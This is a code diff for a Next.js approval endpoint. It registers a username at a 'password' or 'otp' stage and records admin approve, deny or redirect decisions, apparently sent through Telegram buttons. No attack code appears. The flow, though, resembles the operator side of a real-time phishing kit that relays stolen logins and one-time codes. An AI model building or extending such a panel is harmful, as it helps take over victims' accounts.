@@ -1,20 +1,59 @@
 import { NextRequest, NextResponse } from "next/server"
-import { processApprovalDecision, getApprovalRequest } from "@/lib/approval-webhook"
+import {
+  createApprovalRequest,
+  processApprovalDecision,
+  getApprovalRequest,
+} from "@/lib/approval-webhook"
+
+export const dynamic = "force-dynamic"
+export const runtime = "nodejs"
 
 /**
- * Webhook endpoint for Telegram button callbacks
- * Receives approval decisions from admin via Telegram inline buttons
- * 
+ * Approval endpoint
+ *
  * POST /api/approval
- * Body: { approvalId: string, action: "approve" | "deny" | "redirect" }
+ *
+ * Two modes:
+ *  1) Register:  { username: string, stage: "password"|"otp", approvalId?: string }
+ *     -> creates the approval server-side (called when the page starts awaiting approval)
+ *  2) Decide:    { approvalId: string, action: "approve"|"deny"|"redirect" }
+ *     -> records an admin decision (webhook/manual)
  */
 
 export async function POST(request: NextRequest) {
   try {
-    const body = await request.json()
-    const { approvalId, action } = body
+    const body = await request.json().catch(() => null)
+    if (!body || typeof body !== "object") {
+      return NextResponse.json(
+        { success: false, error: "Invalid JSON body" },
+        { status: 400 }
+      )
+    }
 
-    // Validate inputs
+    const { approvalId, action, username, stage } = body as Record<string, unknown>
+
+    // Mode 1: register a new approval request
+    if (typeof username === "string" && (stage === "password" || stage === "otp")) {
+      const approval = createApprovalRequest(
+        username,
+        stage,
+        typeof approvalId === "string" ? approvalId : undefined
+      )
+      return NextResponse.json(
+        {
+          success: true,
+          data: {
+            approvalId: approval.id,
+            username: approval.username,
+            stage: approval.stage,
+            expiresAt: approval.expiresAt,
+          },
+        },
+        { status: 200 }
+      )
+    }
+
+    // Mode 2: record a decision
     if (!approvalId || typeof approvalId !== "string") {
       return NextResponse.json(
         { success: false, error: "Missing or invalid approvalId" },
@@ -22,14 +61,13 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    if (!["approve", "deny", "redirect"].includes(action)) {
+    if (typeof action !== "string" || !["approve", "deny", "redirect"].includes(action)) {
       return NextResponse.json(
         { success: false, error: "Invalid action. Must be: approve, deny, or redirect" },
         { status: 400 }
       )
     }
 
-    // Check if approval exists
     const approval = getApprovalRequest(approvalId)
     if (!approval) {
       return NextResponse.json(
@@ -38,7 +76,6 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Process the decision
     const result = processApprovalDecision(approvalId, action as "approve" | "deny" | "redirect")
 
     return NextResponse.json(
@@ -63,7 +100,7 @@ export async function POST(request: NextRequest) {
   }
 }
 
-export async function GET(request: NextRequest) {
+export async function GET() {
   return NextResponse.json(
     { error: "Use POST to submit approval decisions" },
     { status: 405 }
